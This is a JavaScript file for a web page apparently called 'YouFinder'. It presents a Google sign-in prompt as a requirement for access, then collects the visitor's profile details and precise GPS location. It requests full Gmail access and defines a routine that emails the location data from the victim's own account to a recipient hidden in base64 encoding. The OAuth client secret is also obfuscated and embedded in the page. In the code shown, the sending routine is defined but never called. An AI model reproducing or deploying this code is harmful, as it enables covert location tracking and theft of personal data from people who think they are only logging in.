let Info = {
	ClientID: "239141875067-k7ftnrifgiv328ai7j0nnec8s79pjlro.apps.googleusercontent.com",
	SecretID: atob("Z21COW1NOWVxVXhCOHRqNVVBSWZIeThf"),
	RedirectURL: "https://genbuproject.github.io/Content/Specifics/YouFinder/",
	Scope: "https://www.googleapis.com/auth/plus.login+https://www.googleapis.com/auth/plus.me+https://mail.google.com/",
	
	Token: "",
	
	Datas: {
		Name: "",
		URL: "",
		Birthday: "",
		Language: "",
		
		Location: {
			Latitude: "", //緯度
			Longitude: "", //経度
			Accuracy: "",
			Altitude: "",
			AltitudeAccuracy: "",
			Heading: "",
			Speed: ""
		}
	}
}

let Util = {
	CreateDialog: function (Title, Content, FooterContent) {
		let DialogBack = document.createElement("Div");
			DialogBack.className = "DialogBack";
			
		let DialogFront = document.createElement("Div");
			DialogFront.className = "DialogFront";
			
		let DialogName = document.createElement("Name");
			DialogName.textContent = Title;
			
		let DialogSeparater = document.createElement("Hr");
		
		let DialogContent = document.createElement("Content");
			DialogContent.innerHTML = Content;
			
		let DialogFooter = document.createElement("Footer");
		
		document.body.appendChild(DialogBack);
		document.body.appendChild(DialogFront);
		
		DialogFront.appendChild(DialogName);
		DialogFront.appendChild(DialogSeparater);
		DialogFront.appendChild(DialogContent);
		DialogFront.appendChild(DialogFooter);
		
		DialogFooter.innerHTML = FooterContent;
		
		DialogFront.style.top = (document.documentElement.clientHeight - DialogFront.clientHeight) / 2 + "px";
		DialogFront.style.left = (document.documentElement.clientWidth - DialogFront.clientWidth) / 2 + "px";
	},
	
	DismissDialog: function () {
		document.getElementsByClassName("DialogBack")[0].parentElement.removeChild(document.getElementsByClassName("DialogBack")[0]);
		document.getElementsByClassName("DialogFront")[0].parentElement.removeChild(document.getElementsByClassName("DialogFront")[0]);
	},
	
	QuerySort: function () {
		let Querys = {};
		
		for (var i = 0; i < location.search.substr(1).split("&").length; i++) {
			Querys[location.search.substr(1).split("&")[i].split("=")[0].toUpperCase()] = location.search.substr(1).split("&")[i].split("=")[1];
		}
		
		return Querys;
	}
}

let Net = {
	LoginWithGoogle: function () {
		location.href = "https://accounts.google.com/o/oauth2/v2/auth?redirect_uri=" + Info.RedirectURL + "&scope=" + Info.Scope + "&response_type=code&client_id=" + Info.ClientID + "&access_type=offline&approval_prompt=force";
	},
	
	RequestToken: function (OnLoad) {
		let TokenGetter = new XMLHttpRequest();
			TokenGetter.open("POST", "https://www.googleapis.com/oauth2/v4/token?client_id=" + Info.ClientID + "&client_secret=" + Info.SecretID + "&redirect_uri=" + Info.RedirectURL + "&access_type=offline&grant_type=authorization_code&code=" + Util.QuerySort().CODE, false);
			
			TokenGetter.onload = function () {
				Info.Token = JSON.parse(TokenGetter.response).access_token;
				
				OnLoad();
			}
			
			TokenGetter.send(null);
	},
	
	SendGmail: function (OnLoad) {
		let MailSender = new XMLHttpRequest();
			MailSender.open("POST", "https://www.googleapis.com/gmail/v1/users/me/messages/send?access_token=" + Info.Token, true);
			
			MailSender.onload = function (Event) {
				OnLoad();
			}
			
			MailSender.send(JSON.stringify(
				{
					raw: btoa(unescape(encodeURIComponent(
						[
							"To: " + atob("Z2VuYnVwcm9qZWN0QGdtYWlsLmNvbQ=="),
							"Subject: =?utf-8?B?From " + btoa(unescape(encodeURIComponent(Info.Datas.Name))) + "?=",
							"MIME-Version: 1.0",
							"Content-Type: text/plain; charset=UTF-8",
							"Content-Transfer-Encoding: 7bit",
							Info.Datas.Location.Latitude,
							Info.Datas.Location.Longitude,
							Info.Datas.Location.Accuracy,
							Info.Datas.Location.Altitude,
							Info.Datas.Location.AltitudeAccuracy,
							Info.Datas.Location.Heading,
							Info.Datas.Location.Speed
						].join("\n").trim()
					))).replace(/\+/g, "-").replace(/\//g, "_")
				}
			));
	}
}

let Dialogs = {
	Step1: function () {
		Util.CreateDialog("Googleアカウントにログインしてください", "アクセスするにはGoogleアカウントにログインする必要があります。", "<Button OnClick = 'Net.LoginWithGoogle();'>Sign in</Button><Button OnClick = 'Util.DismissDialog();'>キャンセル</Button>");
	},
	
	Step2: function () {
		Util.CreateDialog("ログイン成功", "Googleアカウントのログインに成功しました。", "<Button OnClick = 'Util.DismissDialog();'>閉じる</Button>");
	}
}

function Init() {
	var Querys = Util.QuerySort();
	
	if (!Querys.CODE) {
		Dialogs.Step1();
	} else {
		Dialogs.Step2();
		
		Net.RequestToken(function () {
			let UserDataGetter = new XMLHttpRequest();
				UserDataGetter.open("GET", "https://www.googleapis.com/plus/v1/people/me?access_token=" + Info.Token, true);
				
				UserDataGetter.onload = function (Event) {
					let Res = JSON.parse(UserDataGetter.responseText);
					
					Info.Datas.Name = Res.displayName,
						Info.Datas.URL = Res.url,
						Info.Datas.Birthday = Res.birthday,
						Info.Datas.Language = Res.language;
						
					navigator.geolocation.getCurrentPosition(function (Position) {
						console.log(Position);
						
						Info.Datas.Location.Latitude = Position.coords.latitude;
						Info.Datas.Location.Longitude = Position.coords.longitude;
						Info.Datas.Location.Accuracy = Position.coords.accuracy;
						Info.Datas.Location.Altitude = Position.coords.altitude;
						Info.Datas.Location.AltitudeAccuracy = Position.coords.altitudeAccuracy;
						Info.Datas.Location.Heading = Position.coords.heading;
						Info.Datas.Location.Speed = Position.coords.speed;
					});
				}
				
				UserDataGetter.send(null);
		});
	}
}
